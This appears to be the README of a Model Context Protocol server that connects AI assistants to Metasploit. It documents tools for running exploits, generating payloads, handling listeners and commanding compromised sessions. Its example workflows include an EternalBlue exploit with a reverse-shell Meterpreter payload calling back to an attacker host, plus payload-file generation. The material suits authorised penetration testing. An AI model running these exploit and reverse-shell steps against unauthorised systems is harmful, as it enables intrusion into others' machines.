# Metasploit MCP Server

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Hosted on Render](https://img.shields.io/badge/Hosted%20on-Render-46E3B7?logo=render)](https://metasploitmcp.onrender.com)
[![Free Hosting](https://img.shields.io/badge/Hosting-Free%20Options-success?style=flat)](FREE_HOSTING_ALTERNATIVES.md)
[![Live Demo](https://img.shields.io/badge/Live%20Demo-Available-brightgreen)](https://metasploitmcp.onrender.com)

A Model Context Protocol (MCP) server for Metasploit Framework integration.

> 📝 **Project Updates**: See [CHANGELOG.md](CHANGELOG.md) for version history and recent changes.  
> 🎓 **New to this project?** Check out the [Beginner's Guide](BEGINNER_GUIDE.md) for a comprehensive introduction!  
> 🛠️ **Tool Reference**: See [TOOLS.md](TOOLS.md) for complete documentation of all 13 MCP tools with examples and best practices.  
> ☁️ **Free Hosting**: See [Free Hosting Alternatives](FREE_HOSTING_ALTERNATIVES.md) for sustainable free deployment options.


https://github.com/user-attachments/assets/39b19fb5-8397-4ccd-b896-d1797ec185e1


## Description

This MCP server provides a bridge between large language models like Claude and the Metasploit Framework penetration testing platform. It allows AI assistants to dynamically access and control Metasploit functionality through standardized tools, enabling a natural language interface to complex security testing workflows.

**🚀 Live Deployment**: https://metasploitmcp.onrender.com (hosted on Render.com)

### Quick Links

- 🎓 **[Beginner's Guide](BEGINNER_GUIDE.md)** - Complete introduction for newcomers
- 🛠️ **[Tools Reference](TOOLS.md)** - Detailed documentation of all 13 tools
- 🤖 **[MCP Integration Guide](MCP_INTEGRATION_GUIDE.md)** - Make available for all AI projects
- ⚡ **[Quick Start Configs](QUICK_START_CONFIG.md)** - Ready-to-use configuration examples
- 🌐 **[Render.com Deployment](RENDER_DEPLOYMENT.md)** - Current hosting on Render.com (recommended)
- ✅ **[Render Setup Checklist](RENDER_SETUP_CHECKLIST.md)** - Complete deployment verification
- ☁️ **[Free Hosting Quick Start](FREE_HOSTING_QUICK_START.md)** - Fast setup for free hosting
- 🌐 **[Free Hosting Alternatives](FREE_HOSTING_ALTERNATIVES.md)** - Complete guide to all free hosting options
- 📋 **[Changelog](CHANGELOG.md)** - Version history and updates
- 🚀 **[Deployment Guide](DEPLOYMENT.md)** - Deployment instructions
- ⚙️ **[Setup Verification](SETUP_VERIFICATION.md)** - Production deployment report
- 🔧 **[msfrpcd Management](MSFRPCD_MANAGEMENT.md)** - Daemon management guide
- 🔒 **[Security Policy](SECURITY.md)** - Security considerations and best practices

## Features

### Module Information

- **list_exploits**: Search and list available Metasploit exploit modules
- **list_payloads**: Search and list available Metasploit payload modules with optional platform and architecture filtering

### Exploitation Workflow

- **run_exploit**: Configure and execute an exploit against a target with options to run checks first
- **run_auxiliary_module**: Run any Metasploit auxiliary module with custom options
- **run_post_module**: Execute post-exploitation modules against existing sessions

### Payload Generation

- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)

### Session Management

- **list_active_sessions**: Show current Metasploit sessions with detailed information
- **send_session_command**: Run a command in an active shell or Meterpreter session
- **terminate_session**: Forcefully end an active session

### Handler Management

- **list_listeners**: Show all active handlers and background jobs
- **start_listener**: Create a new multi/handler to receive connections
- **stop_job**: Terminate any running job or handler

### AI-Powered Analysis (OpenRouter Integration)

- **analyze_exploit_with_ai**: Use AI to analyze exploits and provide detailed insights and recommendations
- **generate_metasploit_commands_with_ai**: Generate Metasploit commands from natural language descriptions
- **analyze_vulnerability_with_ai**: Analyze vulnerabilities and suggest exploitation approaches

## Prerequisites

- Metasploit Framework installed and msfrpcd running
- Python 3.10 or higher
- Required Python packages (see requirements.txt)

## OpenRouter AI Integration (Optional)

The server includes AI-powered analysis features using OpenRouter. To enable these features:

1. Sign up for an OpenRouter account at https://openrouter.ai/
2. Get your API key from the OpenRouter dashboard
3. Copy `.env.example` to `.env.local` and configure your API key:
   ```
   cp .env.example .env.local
   # Edit .env.local with your OpenRouter API key
   ```
4. Or set environment variables directly:
   ```
   OPENROUTER_API_KEY=your_openrouter_api_key_here
   OPENROUTER_BASE_URL=https://openrouter.ai/api/v1  # Optional, defaults to this
   OPENROUTER_MODEL=anthropic/claude-3-haiku:beta    # Optional, defaults to Claude 3 Haiku
   ```

### Using Your Own Hosted AI

If you have your own AI service that provides an OpenAI-compatible API (like your hosted AI at `https://fandresena-portfolio.netlify.app/myai`), you can configure MetasploitMCP to use it instead:

```bash
OPENROUTER_API_KEY=your_api_key
OPENROUTER_BASE_URL=https://fandresena-portfolio.netlify.app/myai/v1  # Adjust the path as needed
OPENROUTER_MODEL=your_model_name  # The model name your service expects
```

### AI Features

When configured, the following AI-powered tools become available:

- **analyze_exploit_with_ai**: Provides detailed technical analysis, impact assessment, and safe usage recommendations for Metasploit exploits
- **generate_metasploit_commands_with_ai**: Converts natural language descriptions into step-by-step Metasploit commands
- **analyze_vulnerability_with_ai**: Analyzes vulnerability descriptions and suggests appropriate exploitation approaches

### Testing Without Metasploit

For testing the MCP server without a full Metasploit installation, you can run in mock mode:

```bash
python MetasploitMCP.py --mock --transport http --host 0.0.0.0 --port 8085
```

This mode provides mock responses for basic Metasploit functionality and allows you to test the AI features and MCP integration.

## Installation

1. Clone this repository
2. Install dependencies:
   ```
   pip install -r requirements.txt
   ```
3. Configure environment variables (optional):
   ```
   MSF_PASSWORD=yourpassword
   MSF_SERVER=127.0.0.1
   MSF_PORT=55553
   MSF_SSL=false
   PAYLOAD_SAVE_DIR=/path/to/save/payloads  # Optional: Where to save generated payloads
   OPENROUTER_API_KEY=your_openrouter_api_key  # Optional: For AI features
   OPENROUTER_MODEL=anthropic/claude-3-haiku:beta  # Optional: AI model to use
   ```
   
   **Note:** A `.env.local` template file is already provided in the repository. Copy `.env.example` to `.env.local` and edit it with your actual values.

## Usage

Start the Metasploit RPC service:

```bash
msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
```

### Transport Options

The server supports two transport methods:

- **HTTP/SSE (Server-Sent Events)**: Default mode for interoperability with most MCP clients
- **STDIO (Standard Input/Output)**: Used with Claude Desktop and similar direct pipe connections

You can explicitly select the transport mode using the `--transport` flag:

```bash
# Run with HTTP/SSE transport (default)
python MetasploitMCP.py --transport http

# Run with STDIO transport
python MetasploitMCP.py --transport stdio

# Run in mock mode for testing (no Metasploit required)
python MetasploitMCP.py --mock --transport http
```

Additional options for HTTP mode:
```bash
python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
```

## Making Available for All AI Projects

MetasploitMCP can be integrated with any MCP-compatible AI assistant. See the comprehensive **[MCP Integration Guide](MCP_INTEGRATION_GUIDE.md)** for:

- 📦 Publishing to MCP Registry
- 📘 NPM Package Distribution
- 🐳 Docker Hub Publishing
- 🔗 Integration with Claude, Copilot, LangChain, AutoGPT, and more
- 🔒 Security best practices for public deployment
- ✅ Complete checklist for making your server discoverable

For quick configuration examples, see **[Quick Start Configs](QUICK_START_CONFIG.md)**.

### Claude Desktop Integration

For Claude Desktop integration, configure `claude_desktop_config.json`:

```json
{
    "mcpServers": {
        "metasploit": {
            "command": "uv",
            "args": [
                "--directory",
                "C:\\path\\to\\MetasploitMCP",
                "run",
                "MetasploitMCP.py",
                "--transport",
                "stdio"
            ],
            "env": {
                "MSF_PASSWORD": "yourpassword",
                "OPENROUTER_API_KEY": "your_openrouter_api_key"
            }
        }
    }
}
```

**Note:** Environment variables can also be configured in a `.env.local` file in the project directory.

### Other MCP Clients

For other MCP clients that use HTTP/SSE:

1. Start the server in HTTP mode:
   ```bash
   python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
   ```

2. Configure your MCP client to connect to:
   - SSE endpoint: `http://your-server-ip:8085/sse`

## Security Configuration

This project includes enhanced security measures:

### Secure Password Generation

A cryptographically secure password has been generated for Metasploit RPC access:
- **Length**: 32 characters
- **Generated using**: OpenSSL rand with base64 encoding
- **Stored in**: `.env.local` (not committed to version control)

### Environment Variables

- **MSF_PASSWORD**: Securely generated random password
- **MSF_SSL**: Currently set to `false` (can be enabled for production)
- **OPENROUTER_API_KEY**: Your OpenRouter API key for AI features

### Best Practices

1. **Never commit secrets**: `.env.local` is in `.gitignore`
2. **Use SSL in production**: Set `MSF_SSL=true` for encrypted communication
3. **Regular password rotation**: Generate new passwords periodically
4. **Access control**: Only run Metasploit RPC on trusted networks

## Example Workflows

### Basic Exploitation

1. List available exploits: `list_exploits("ms17_010")`
2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
3. List sessions: `list_active_sessions()`
4. Run commands: `send_session_command(1, "whoami")`

### Post-Exploitation

1. Run a post module: `run_post_module("windows/gather/enum_logged_on_users", 1)`
2. Send custom commands: `send_session_command(1, "sysinfo")`
3. Terminate when done: `terminate_session(1)`

### Handler Management

1. Start a listener: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
2. List active handlers: `list_listeners()`
3. Generate a payload: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
4. Stop a handler: `stop_job(1)`

For complete tool documentation with detailed parameters, examples, and best practices, see **[TOOLS.md](TOOLS.md)**.

## Testing

This project includes comprehensive unit and integration tests to ensure reliability and maintainability.

### Prerequisites for Testing

Install test dependencies:

```bash
pip install -r requirements-test.txt
```

Or use the convenient installer:

```bash
python run_tests.py --install-deps
# OR
make install-deps
```

### Running Tests

#### Quick Commands

```bash
# Run all tests
python run_tests.py --all
# OR
make test

# Run with coverage report
python run_tests.py --all --coverage
# OR
make coverage

# Run with HTML coverage report
python run_tests.py --all --coverage --html
# OR
make coverage-html
```

#### Specific Test Suites

```bash
# Unit tests only
python run_tests.py --unit
# OR
make test-unit

# Integration tests only  
python run_tests.py --integration
# OR
make test-integration

# Options parsing tests
python run_tests.py --options
# OR
make test-options

# Helper function tests
python run_tests.py --helpers
# OR
make test-helpers

# MCP tools tests
python run_tests.py --tools
# OR
make test-tools
```

#### Test Options

```bash
# Include slow tests
python run_tests.py --all --slow

# Include network tests (requires actual network)
python run_tests.py --all --network

# Verbose output
python run_tests.py --all --verbose

# Quick test (no coverage, fail fast)
make quick-test

# Debug mode (detailed failure info)
make test-debug
```

### Test Structure

- **`tests/test_options_parsing.py`**: Unit tests for the graceful options parsing functionality
- **`tests/test_helpers.py`**: Unit tests for internal helper functions and MSF client management
- **`tests/test_tools_integration.py`**: Integration tests for all MCP tools with mocked Metasploit backend
- **`conftest.py`**: Shared test fixtures and configuration
- **`pytest.ini`**: Pytest configuration with coverage settings

### Test Features

- **Comprehensive Mocking**: All Metasploit dependencies are mocked, so tests run without requiring an actual MSF installation
- **Async Support**: Full async/await testing support using pytest-asyncio
- **Coverage Reporting**: Detailed coverage analysis with HTML reports
- **Parametrized Tests**: Efficient testing of multiple input scenarios
- **Fixture Management**: Reusable test fixtures for common setup scenarios

### Coverage Reports

After running tests with coverage, reports are available in:

- **Terminal**: Coverage summary displayed after test run
- **HTML**: `htmlcov/index.html` (when using `--html` option)

### CI/CD Integration

For continuous integration:

```bash
# CI-friendly test command
make ci-test
# OR
python run_tests.py --all --coverage --verbose
```

## Configuration Options

### Payload Save Directory

By default, payloads generated with `generate_payload` are saved to a `payloads` directory in your home folder (`~/payloads` or `C:\Users\YourUsername\payloads`). You can customize this location by setting the `PAYLOAD_SAVE_DIR` environment variable.

**Setting the environment variable:**

- **Windows (PowerShell)**:
  ```powershell
  $env:PAYLOAD_SAVE_DIR = "C:\custom\path\to\payloads"
  ```

- **Windows (Command Prompt)**:
  ```cmd
  set PAYLOAD_SAVE_DIR=C:\custom\path\to\payloads
  ```

- **Linux/macOS**:
  ```bash
  export PAYLOAD_SAVE_DIR=/custom/path/to/payloads
  ```

- **In Claude Desktop config**:
  ```json
  "env": {
      "MSF_PASSWORD": "yourpassword",
      "PAYLOAD_SAVE_DIR": "C:\\your\\actual\\path\\to\\payloads"  // Only add if you want to override the default
  }
  ```

**Note:** If you specify a custom path, make sure it exists or the application has permission to create it. If the path is invalid, payload generation might fail.

You can also set this in your `.env.local` file:
```
PAYLOAD_SAVE_DIR=/custom/path/to/payloads
```
## Deployment

> 🌐 **Current Hosting**: This project is deployed on **Render.com** at https://metasploitmcp.onrender.com with free tier offering 750 hours/month! See **[RENDER_DEPLOYMENT.md](RENDER_DEPLOYMENT.md)** for complete guide.
> 
> ☁️ **Alternative Hosting Options**: For other free hosting alternatives, see **[FREE_HOSTING_ALTERNATIVES.md](FREE_HOSTING_ALTERNATIVES.md)** covering Railway, Fly.io, Koyeb, Oracle Cloud, Deta Space, and more!
> ☁️ **Looking for Free Hosting?** Fly.io offers only a 7-day free trial. For sustainable free alternatives, see **[FREE_HOSTING_ALTERNATIVES.md](FREE_HOSTING_ALTERNATIVES.md)** covering Railway, Render, Koyeb, Oracle Cloud (recommended - you already have this!), Deta Space, and more!

### Render.com Deployment (Current - Recommended)

✅ **Current deployment**: https://metasploitmcp.onrender.com

Render.com offers:
- **750 hours/month free**: Enough for continuous running
- **Automatic HTTPS**: SSL certificates included
- **No cold starts**: Always ready (unlike Fly.io free tier)
- **Auto-deploy**: From GitHub on every push
- **Easy setup**: One-click deployment with `render.yaml`

See **[RENDER_DEPLOYMENT.md](RENDER_DEPLOYMENT.md)** for complete deployment guide.

### Quick Deploy to Render

1. Fork this repository
2. Sign up at https://render.com
3. Click "New" → "Blueprint"
4. Connect your forked repository
5. Set environment variables (MSF_SERVER, MSF_PASSWORD, etc.)
6. Deploy!

### Fly.io Deployment (Alternative)

⚠️ **Note**: Fly.io provides only 7 days free trial, then requires payment (~$5-10/month).

#### Quick Deployment to Fly.io

1. **Install Fly CLI**:
   ```bash
   curl -L https://fly.io/install.sh | sh
   ```

2. **Login to Fly.io**:
   ```bash
   flyctl auth login
   ```

3. **Launch your app**:
   ```bash
   flyctl launch --no-deploy
   ```
   - Choose a unique app name
   - Select a region close to your users
   - Skip database setup (not required)

4. **Set environment secrets** (optional):
   ```bash
   flyctl secrets set MSFRPCD_PASSWORD=your_secure_password
   flyctl secrets set OPENROUTER_API_KEY=your_api_key
   ```

5. **Deploy**:
   ```bash
   flyctl deploy
   ```

#### Fly.io Configuration

The included `fly.toml` configuration provides:
- **Auto-scaling**: Machines stop when idle (cost-efficient)
- **HTTPS**: Automatically enabled
- **Memory**: 1GB RAM (adjustable)
- **Region**: Ashburn, Virginia (iad) - configurable
- **Mock Mode**: Runs without Metasploit Framework by default

#### Connecting to External Metasploit

To connect your Fly.io deployment to a Metasploit instance:

**Option 1: Via Tunnel (Development)**
```bash
# Expose your local msfrpcd with ngrok
ngrok tcp 55553

# Configure Fly.io with tunnel URL
flyctl secrets set MSFRPCD_HOST="0.tcp.ngrok.io"
flyctl secrets set MSFRPCD_PORT="12345"  # Use port from ngrok
flyctl secrets set MSFRPCD_PASSWORD="your_password"
```

**Option 2: VPS/Cloud Server (Production)**
```bash
# Configure with your VPS IP
flyctl secrets set MSFRPCD_HOST="your.vps.ip"
flyctl secrets set MSFRPCD_PORT="55553"
flyctl secrets set MSFRPCD_PASSWORD="your_password"
```

#### Fly.io Management Commands

```bash
# View app status
flyctl status

# View logs in real-time
flyctl logs

# Scale resources
flyctl scale memory 2048  # Increase to 2GB
flyctl scale count 2      # Add more machines

# SSH into machine
flyctl ssh console

# Open app in browser
flyctl open
```

For detailed deployment instructions, see [DEPLOYMENT.md](DEPLOYMENT.md).

### Production Deployment Verification

This project includes comprehensive setup verification tools and documentation:

- **[SETUP_VERIFICATION.md](SETUP_VERIFICATION.md)** - Complete verification report with:
  - Configuration summary (remote server, msfrpcd, MCP server)
  - All verification tests with actual results
  - Usage examples and maintenance commands
  - Security notes and troubleshooting guide

- **[manage-services.sh](manage-services.sh)** - Service management script:
  ```bash
  # Check status of all services
  ./manage-services.sh status
  
  # Start/stop/restart services
  ./manage-services.sh start
  ./manage-services.sh stop
  ./manage-services.sh restart
  
  # Test connectivity
  ./manage-services.sh test
  ```

For step-by-step setup and verification of a production MetasploitMCP deployment, refer to these resources.

### Oracle Cloud Deployment

MetasploitMCP can also be deployed on Oracle Cloud Infrastructure (OCI), which offers generous free tier resources.

#### Oracle Cloud Free Tier Benefits

- **Always Free VMs**: 2 AMD-based Compute VMs with 1/8 OCPU and 1 GB memory each
- **Ampere A1 Compute**: 4 OCPUs and 24 GB memory (can be split into 4 VMs)
- **Block Volumes**: 200 GB total of block volume storage
- **Networking**: 10 TB outbound data transfer per month
- **Load Balancer**: 1 flexible load balancer (10 Mbps)

#### Deployment Options on Oracle Cloud

**Option 1: Docker Container on Compute Instance**

1. **Create a Compute Instance** (Always Free eligible):
   - OS: Ubuntu 22.04 or Oracle Linux 8
   - Shape: VM.Standard.E2.1.Micro or VM.Standard.A1.Flex
   - Configure networking and security lists

2. **Install Docker**:
   ```bash
   curl -fsSL https://get.docker.com -o get-docker.sh
   sudo sh get-docker.sh
   sudo usermod -aG docker $USER
   ```

3. **Clone and run**:
   ```bash
   git clone https://github.com/FandresenaR/MetasploitMCP.git
   cd MetasploitMCP
   
   # Build Docker image
   docker build -t metasploit-mcp .
   
   # Run container
   docker run -d -p 8080:8080 \
     -e MSFRPCD_PASSWORD=your_password \
     -e OPENROUTER_API_KEY=your_api_key \
     --name metasploit-mcp \
     metasploit-mcp
   ```

4. **Configure firewall**:
   ```bash
   # Open port 8080
   sudo iptables -I INPUT 6 -m state --state NEW -p tcp --dport 8080 -j ACCEPT
   sudo netfilter-persistent save
   ```

5. **Configure OCI Security List**:
   - Add ingress rule for port 8080 (TCP)
   - Optionally configure a Load Balancer with SSL termination

**Option 2: Oracle Container Instances**

1. **Push image to Oracle Container Registry (OCIR)**:
   ```bash
   docker tag metasploit-mcp <region>.ocir.io/<tenancy-namespace>/metasploit-mcp:latest
   docker push <region>.ocir.io/<tenancy-namespace>/metasploit-mcp:latest
   ```

2. **Create Container Instance** via OCI Console:
   - Select your image from OCIR
   - Configure environment variables (secrets)
   - Set up networking and security

**Option 3: Kubernetes on OKE (Container Engine for Kubernetes)**

For production workloads requiring high availability:

1. **Create OKE cluster** (requires paid resources or use free tier creatively)
2. **Deploy with Kubernetes manifests**:
   ```yaml
   apiVersion: apps/v1
   kind: Deployment
   metadata:
     name: metasploit-mcp
   spec:
     replicas: 2
     selector:
       matchLabels:
         app: metasploit-mcp
     template:
       metadata:
         labels:
           app: metasploit-mcp
       spec:
         containers:
         - name: metasploit-mcp
           image: <your-image>
           ports:
           - containerPort: 8080
           env:
           - name: MSFRPCD_PASSWORD
             valueFrom:
               secretKeyRef:
                 name: msf-secrets
                 key: password
   ```

#### Oracle Cloud Considerations

**Pros:**
- Generous free tier with good resources
- Persistent compute instances
- Full control over the environment
- Can install Metasploit Framework directly
- No cold starts (unlike Fly.io auto-stop)

**Cons:**
- More manual configuration required
- You manage OS updates and security
- No automatic HTTPS (need to configure)
- Manual scaling

**Cost Comparison:**
- **Fly.io**: ~$5-10/month, auto-scaling, managed infrastructure
- **Oracle Cloud**: Free tier available, but you manage everything

#### Securing Oracle Cloud Deployment

1. **Use Oracle Vault** for secrets management
2. **Configure Security Lists** to restrict access
3. **Enable OS firewall** (iptables/firewalld)
4. **Use Oracle Load Balancer** with SSL certificates
5. **Set up monitoring** with OCI Monitoring service
6. **Regular updates**: `sudo apt update && sudo apt upgrade`

#### Recommended Architecture on Oracle Cloud

```
Internet
    ↓
[Load Balancer with SSL]
    ↓
[Security List / WAF]
    ↓
[Compute Instance - MetasploitMCP]
    ↓
[Metasploit Framework (optional)]
```

For a production setup, consider:
- **Load Balancer**: For SSL termination and multiple instances
- **Object Storage**: For payload file storage
- **OCI Vault**: For secrets management
- **Monitoring & Logging**: OCI native services

### Deployment Comparison

| Feature | Render.com | Fly.io | Oracle Cloud |
|---------|------------|--------|--------------|
| **Setup Time** | 3 minutes | 5 minutes | 30+ minutes |
| **Cost (Free Tier)** | 750 hrs/month | 7-day trial | Always free |
| **Auto-scaling** | ⚠️ Limited | ✅ Built-in | ❌ Manual |
| **HTTPS** | ✅ Automatic | ✅ Automatic | ❌ Manual setup |
| **Maintenance** | ✅ Managed | ✅ Managed | ❌ You manage |
| **Cold Starts** | ⚠️ Minimal | ✅ Yes (auto-stop) | ❌ Always running |
| **Auto-deploy** | ✅ GitHub | ✅ CLI/GitHub | ❌ Manual |
| **Full Metasploit** | ⚠️ External | ⚠️ Complex | ✅ Easy to install |
| **Control** | ⚠️ Limited | ⚠️ Limited | ✅ Full control |
| **Current Status** | ✅ **IN USE** | Alternative | Alternative |

**Recommendation:**
- **Render.com**: Best for production API, free hosting, auto-deploy (⭐ **CURRENTLY USED**)
- **Fly.io**: Good for quick demos, but requires payment after 7 days
- **Oracle Cloud**: Best for running Metasploit Framework directly, full control

## License

Apache 2.0
